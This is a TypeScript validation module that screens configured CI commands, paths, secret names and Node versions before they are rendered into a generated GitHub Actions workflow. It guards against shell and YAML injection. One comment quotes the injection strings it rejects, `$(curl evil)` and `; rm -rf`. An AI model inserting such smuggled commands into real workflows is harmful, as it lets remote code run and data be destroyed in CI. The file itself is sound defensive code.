import type { CommandSafetyPolicy } from "../../domain/policies/command-safety-policy";
import { authEnvKeyProblem, type TestHubSettings } from "../../domain/settings/settings";
import { appError, type AppError } from "../../shared/errors/errors";

// npm subcommands the generated CI workflow may run: a script (`npm run …`) or
// a dependency install (`npm install`/`npm ci` and its documented aliases).
const NPM_CI_SUBCOMMANDS = new Set([
  "run",
  "install",
  "ci",
  "clean-install",
  "ic",
  "install-clean",
  "isntall-clean",
]);

/**
 * True when a (already charset-screened) command is an npm install/ci/run
 * invocation. Used to permit configured CI commands — including custom scripts
 * and install flags — while still rejecting arbitrary programs.
 *
 * - `npm run <script> [...]` requires a script-name token.
 * - `npm install`/`npm ci` (and aliases) accept only FLAG arguments (tokens
 *   starting with `-`). A positional `<package-spec>` is rejected so a tampered
 *   `npm install left-pad` can't install arbitrary packages (and run their
 *   lifecycle scripts) in CI instead of the runner's locked dependencies.
 */
const isNpmCiShape = (command: string): boolean => {
  const tokens = command.split(/\s+/).filter(Boolean);
  if (tokens[0] !== "npm" || tokens[1] === undefined) return false;
  if (!NPM_CI_SUBCOMMANDS.has(tokens[1])) return false;
  if (tokens[1] === "run") return tokens[2] !== undefined;
  // install / ci forms: every extra token must be a flag, never a package spec.
  return tokens.slice(2).every((token) => token.startsWith("-"));
};

// Actions runs `run:` steps through a shell, so a configured CI command must be
// free of shell metacharacters (even after a `--` separator) AND a recognised
// argv shape: one the ADR-0010 local-spawn allowlist (`commandSafety`) accepts
// verbatim, or the relaxed npm ci/run shape above. Exported so CI-readiness
// validation can reject exactly the commands `generate()` would refuse to
// write, keeping the two consistent.
const CI_COMMAND_CHARSET = /^[A-Za-z0-9 _:./=@-]+$/;
export const isSafeCiCommand = (command: string, commandSafety: CommandSafetyPolicy): boolean =>
  CI_COMMAND_CHARSET.test(command) &&
  (isNpmCiShape(command) || commandSafety.assertSafe(command.split(/\s+/).filter(Boolean)).ok);

// ── Per-value screens ──────────────────────────────────────────────────────
// Each returns the AppError describing the first problem it finds, or null when
// the value is safe, so the generator orchestrates the write instead of
// inlining every guard (TD-009). All are pure and exercised through
// `generate()`'s tests.

/** True if any character is a C0 control char (codepoint <= 0x1F, e.g. newline/tab). */
const hasControlChar = (value: string): boolean => {
  for (let i = 0; i < value.length; i += 1) {
    if (value.charCodeAt(i) <= 0x1f) return true;
  }
  return false;
};

/**
 * Reject control characters (newlines especially) in EVERY value rendered into
 * the YAML — a multiline value would break out of its `run:`/`with:` line and
 * inject arbitrary workflow steps even though the tokenized command check (which
 * splits on whitespace) wouldn't see it.
 */
const screenControlChars = (values: readonly string[]): AppError | null => {
  for (const value of values) {
    if (hasControlChar(value)) {
      return appError(
        "VALIDATION_FAILED",
        `Configured CI value contains a control character and can't be written to the workflow: ${JSON.stringify(value)}.`,
        { details: { value } },
      );
    }
  }
  return null;
};

/**
 * The runner path is rendered into several UNQUOTED YAML scalars
 * (working-directory, cache-dependency-path, upload path), so keep it to plain
 * path characters — no YAML syntax (`:`, `#`, quotes) or shell metacharacters,
 * no traversal, no absolute root.
 */
const screenRunnerPath = (runnerPath: string): AppError | null => {
  if (
    !/^[A-Za-z0-9 _./-]+$/.test(runnerPath) ||
    runnerPath.startsWith("/") ||
    runnerPath.split("/").includes("..")
  ) {
    return appError(
      "VALIDATION_FAILED",
      `Configured runner path is not a safe relative path for the workflow: ${JSON.stringify(runnerPath)}.`,
      { details: { runnerPath } },
    );
  }
  return null;
};

/**
 * Auth keys are rendered as `secrets.<KEY>` (and as YAML map keys). Each must
 * clear the shared domain rule `authEnvKeyProblem` (identifier-shaped, not a
 * reserved process-control variable like PATH/NODE_OPTIONS). GitHub additionally
 * forbids the `GITHUB_` prefix for repository secrets, so a `secrets.GITHUB_PAT`
 * reference could never resolve — reject it here (this CI-only prefix rule).
 */
const screenAuthKeys = (authKeys: readonly string[]): AppError | null => {
  for (const key of authKeys) {
    if (authEnvKeyProblem(key) || key.startsWith("GITHUB_")) {
      return appError(
        "VALIDATION_FAILED",
        `Auth env key is not a valid secret name for the workflow: ${JSON.stringify(key)}.`,
        { details: { key } },
      );
    }
  }
  return null;
};

/** The Node version is a YAML scalar; keep it to a plain version/range token. */
const screenNodeVersion = (nodeVersion: string): AppError | null => {
  if (!/^[0-9A-Za-z.\-_/>=<^~* |]+$/.test(nodeVersion)) {
    return appError(
      "VALIDATION_FAILED",
      `CI node version is not a valid version token: "${nodeVersion}".`,
      { details: { nodeVersion } },
    );
  }
  return null;
};

/**
 * Actions runs `run:` steps through a shell, so each configured CI command must
 * be free of shell metacharacters — including ones smuggled in after a `--`
 * separator the argv allowlist passes through as literal args — AND a recognised
 * argv shape (the npm ci/run shape, or one the ADR-0010 allowlist accepts).
 * Screen the WHOLE command against a shell-safe charset BEFORE the argv check so
 * `npm run test:ci -- $(curl evil)`, `; rm -rf`, backticks, pipes, etc. are
 * rejected.
 */
const screenCiCommands = (
  commands: readonly string[],
  commandSafety: CommandSafetyPolicy,
): AppError | null => {
  for (const command of commands) {
    if (!CI_COMMAND_CHARSET.test(command)) {
      return appError(
        "VALIDATION_FAILED",
        `Configured CI command contains a character unsafe for a shell run-step: "${command}".`,
        { details: { command } },
      );
    }
    if (
      !isNpmCiShape(command) &&
      !commandSafety.assertSafe(command.split(/\s+/).filter(Boolean)).ok
    ) {
      return appError(
        "VALIDATION_FAILED",
        `Configured CI command must be an "npm run/install/ci" invocation: "${command}".`,
        { details: { command } },
      );
    }
  }
  return null;
};

/**
 * The "Run tests" step must actually invoke an npm SCRIPT (`npm run <script>`),
 * not an install/ci — otherwise a `ciRunCommand` of `npm ci` would generate a
 * workflow whose test step only installs dependencies (and readiness would skip
 * the package-script check).
 */
const screenRunShape = (effectiveRun: string): AppError | null => {
  const runTokens = effectiveRun.split(/\s+/).filter(Boolean);
  if (runTokens[0] !== "npm" || runTokens[1] !== "run" || runTokens[2] === undefined) {
    return appError(
      "VALIDATION_FAILED",
      `CI run command must be an "npm run <script>": "${effectiveRun}".`,
      { details: { command: effectiveRun } },
    );
  }
  return null;
};

/**
 * The workflow path is repo-root relative (TIS §8.13), not a VaultPath, and
 * `ci.workflowPath` isn't validated by SettingsService — so reject traversal /
 * absolute / drive-letter paths, then require the GitHub-discoverable shape
 * (`.github/workflows/<name>.yml|.yaml`, no nesting). Expects POSIX-normalized
 * input. Called after the vault base resolves so the failure ordering matches
 * the original inline gauntlet.
 */
export const screenWorkflowPath = (relativePath: string): AppError | null => {
  if (
    relativePath.trim() === "" ||
    relativePath.startsWith("/") ||
    /^[A-Za-z]:/.test(relativePath) ||
    relativePath.split(/[/\\]/).includes("..")
  ) {
    return appError(
      "VALIDATION_FAILED",
      `CI workflow path must be a repo-relative path without "..": "${relativePath}".`,
      { details: { path: relativePath } },
    );
  }
  if (!/^\.github\/workflows\/[^/]+\.ya?ml$/.test(relativePath)) {
    return appError(
      "VALIDATION_FAILED",
      `GitHub Actions workflow path must be a .yml/.yaml file directly under ".github/workflows/": "${relativePath}".`,
      { details: { path: relativePath } },
    );
  }
  return null;
};

/**
 * Screens every settings-derived value a GitHub Actions workflow interpolates,
 * in the original gauntlet's order, returning the first problem or null. Pure:
 * the caller does the I/O (base-path resolve, overwrite check, write) once this
 * passes. The workflow path is screened separately ({@link screenWorkflowPath})
 * because the original validates it after the vault base resolves.
 */
export const screenRequestInputs = (
  settings: TestHubSettings,
  commandSafety: CommandSafetyPolicy,
): AppError | null => {
  const effectiveInstall = settings.runner.ciInstallCommand.trim() || "npm ci";
  const effectiveRun = settings.runner.ciRunCommand.trim() || "npm run test:ci";
  const nodeVersion = settings.ci.nodeVersion.trim() || "22";
  const runnerPath = settings.paths.testRunnerPath.replace(/\\/g, "/");
  const authKeys = [
    ...new Set(
      Object.values(settings.sut.environments).flatMap((e) => Object.keys(e.auth?.env ?? {})),
    ),
  ];
  return (
    screenControlChars([effectiveInstall, effectiveRun, nodeVersion, runnerPath, ...authKeys]) ??
    screenRunnerPath(runnerPath) ??
    screenAuthKeys(authKeys) ??
    screenNodeVersion(nodeVersion) ??
    screenCiCommands([effectiveInstall, effectiveRun], commandSafety) ??
    screenRunShape(effectiveRun)
  );
};
